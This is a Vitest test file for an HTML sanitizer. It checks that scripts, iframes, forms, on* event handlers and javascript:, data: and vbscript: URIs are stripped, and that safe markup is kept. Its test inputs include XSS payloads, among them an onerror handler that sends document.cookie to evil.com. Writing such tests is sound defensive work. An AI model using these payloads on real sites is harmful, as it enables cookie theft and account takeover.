import { describe, expect, it } from 'vitest';
import { sanitizeHtml } from '@/lib/security/sanitize-html';

describe('sanitizeHtml', () => {
  // ── Script stripping ──────────────────────────────────────────────────────

  it('strips <script> tags and their content', () => {
    const result = sanitizeHtml('<p>Hello</p><script>alert("xss")</script>');
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('alert');
    expect(result).toContain('<p>Hello</p>');
  });

  it('strips <script> with src attribute', () => {
    const result = sanitizeHtml('<script src="https://evil.com/payload.js"></script>');
    expect(result).not.toContain('<script');
    expect(result).not.toContain('evil.com');
  });

  it('strips multi-line script blocks', () => {
    const result = sanitizeHtml('<p>Safe</p><script>\nconst x = 1;\nalert(x);\n</script><p>After</p>');
    expect(result).not.toContain('<script');
    expect(result).not.toContain('alert');
    expect(result).toBe('<p>Safe</p><p>After</p>');
  });

  // ── Dangerous elements ────────────────────────────────────────────────────

  it('strips <iframe> elements', () => {
    const result = sanitizeHtml('<p>Text</p><iframe src="https://evil.com"></iframe>');
    expect(result).not.toContain('<iframe');
    expect(result).toContain('<p>Text</p>');
  });

  it('strips <object> elements', () => {
    const result = sanitizeHtml('<object data="evil.swf"><param name="x" value="y"></object>');
    expect(result).not.toContain('<object');
  });

  it('strips <form> elements', () => {
    const result = sanitizeHtml('<form action="https://evil.com"><input type="hidden"></form>');
    expect(result).not.toContain('<form');
  });

  it('strips <link> self-closing elements', () => {
    const result = sanitizeHtml('<link rel="stylesheet" href="evil.css" /><p>OK</p>');
    expect(result).not.toContain('<link');
    expect(result).toContain('<p>OK</p>');
  });

  // ── Event handler attribute stripping ────────────────────────────────────

  it('strips onclick event handler', () => {
    const result = sanitizeHtml('<p onclick="alert(1)">Click me</p>');
    expect(result).not.toContain('onclick');
    expect(result).not.toContain('alert');
    expect(result).toContain('<p>Click me</p>');
  });

  it('strips onload event handler', () => {
    const result = sanitizeHtml('<img src="safe.png" onload="stealCookies()">');
    expect(result).not.toContain('onload');
    expect(result).not.toContain('stealCookies');
  });

  it('strips onerror event handler', () => {
    const result = sanitizeHtml('<img src="x" onerror="fetch(\'https://evil.com?\'+document.cookie)">');
    expect(result).not.toContain('onerror');
  });

  it('strips onmouseover and other on* handlers', () => {
    const result = sanitizeHtml('<a href="#" onmouseover="track()" onfocus="leak()">Link</a>');
    expect(result).not.toContain('onmouseover');
    expect(result).not.toContain('onfocus');
    expect(result).toContain('href="#"');
    expect(result).toContain('Link');
  });

  // ── JavaScript URI stripping ──────────────────────────────────────────────

  it('strips javascript: URI from href', () => {
    const result = sanitizeHtml('<a href="javascript:alert(1)">Click</a>');
    expect(result).not.toContain('javascript:');
    expect(result).toContain('href="#"');
    expect(result).toContain('Click');
  });

  it('strips data: URI from href', () => {
    const result = sanitizeHtml('<a href="data:text/html,<script>alert(1)</script>">X</a>');
    expect(result).not.toContain('data:text');
    expect(result).toContain('href="#"');
  });

  it('strips vbscript: URI from href', () => {
    const result = sanitizeHtml('<a href="vbscript:MsgBox(1)">X</a>');
    expect(result).not.toContain('vbscript:');
  });

  it('strips javascript: URI from src', () => {
    const result = sanitizeHtml('<img src="javascript:alert(1)">');
    expect(result).not.toContain('javascript:');
  });

  // ── Safe content passthrough ──────────────────────────────────────────────

  it('passes safe formatting tags through unchanged', () => {
    const safe = '<p><strong>Bold</strong> and <em>italic</em> text.</p>';
    expect(sanitizeHtml(safe)).toBe(safe);
  });

  it('passes safe list markup through', () => {
    const safe = '<ul><li>Item 1</li><li>Item 2</li></ul>';
    expect(sanitizeHtml(safe)).toBe(safe);
  });

  it('preserves safe anchor href', () => {
    const safe = '<a href="https://ranibeautyclinic.com">Rani</a>';
    expect(sanitizeHtml(safe)).toBe(safe);
  });

  it('preserves headings', () => {
    const safe = '<h2>Section Title</h2><p>Body text.</p>';
    expect(sanitizeHtml(safe)).toBe(safe);
  });

  it('preserves br tags', () => {
    const safe = 'Line 1<br />Line 2';
    expect(sanitizeHtml(safe)).toBe(safe);
  });

  it('returns empty string for empty input', () => {
    expect(sanitizeHtml('')).toBe('');
  });

  it('returns plain text unchanged', () => {
    const text = 'No HTML here, just plain text with special chars like & and >.';
    expect(sanitizeHtml(text)).toBe(text);
  });
});
